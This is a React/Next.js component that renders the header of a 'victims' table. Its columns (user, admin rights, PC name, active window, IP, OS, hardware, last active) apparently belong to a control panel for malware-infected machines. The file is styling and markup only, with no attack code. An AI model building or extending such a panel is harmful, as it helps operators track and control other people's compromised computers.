import Image from "next/image";

import { cn } from "../../../../lib/utils";

import { victimsColumnSizeClass, type VictimsColumnKey } from "./victims-columns";

function HeaderCell(props: {
  col: VictimsColumnKey;
  label?: string;
  withIcon?: boolean;
  iconOnly?: boolean;
}) {
  const { col, label, withIcon, iconOnly } = props;

  return (
    <th
      className={cn(
        "sticky top-0 z-[2] bg-[#202020] px-[4px] pb-[3px] pt-0 text-left text-[20px] font-normal leading-[1.05] text-white/[0.98]",
        "select-none",
        victimsColumnSizeClass(col),
      )}
      style={{ borderBottom: "3px solid var(--line)" }}
    >
      {col === "h-admin" || col === "h-id" ? (
        label
      ) : (
        <span className="inline-flex items-center gap-[6px]">
          <span className="mr-[6px] opacity-65">|</span>
          {withIcon && (
            <Image
              className="h-[14px] w-[14px] opacity-90 [filter:brightness(0)_invert(1)]"
              src="/icons/listtop.svg"
              alt=""
              width={14}
              height={14}
              draggable={false}
            />
          )}
          {!iconOnly && <span>{label}</span>}
        </span>
      )}
    </th>
  );
}

export function VictimsTableHeader() {
  return (
    <thead>
      <tr>
        <HeaderCell col="h-country" label="loc" />
        <HeaderCell col="h-icon" withIcon iconOnly />
        <HeaderCell col="h-user" label="user" withIcon />
        <HeaderCell col="h-admin" label="admin" />
        <HeaderCell col="h-pc-name" label="pc-name" withIcon />
        <HeaderCell col="h-window" label="window" withIcon />
        <HeaderCell col="h-last-active" label="last active" withIcon />
        <HeaderCell col="h-id" label="id" />
        <HeaderCell col="h-ip" label="ip" withIcon />
        <HeaderCell col="h-os" label="os" withIcon />
        <HeaderCell col="h-cpu" label="cpu" withIcon />
        <HeaderCell col="h-ram" label="ram" withIcon />
        <HeaderCell col="h-gpu" label="gpu" withIcon />
        <HeaderCell col="h-comment" label="comment" withIcon />
      </tr>
    </thead>
  );
}
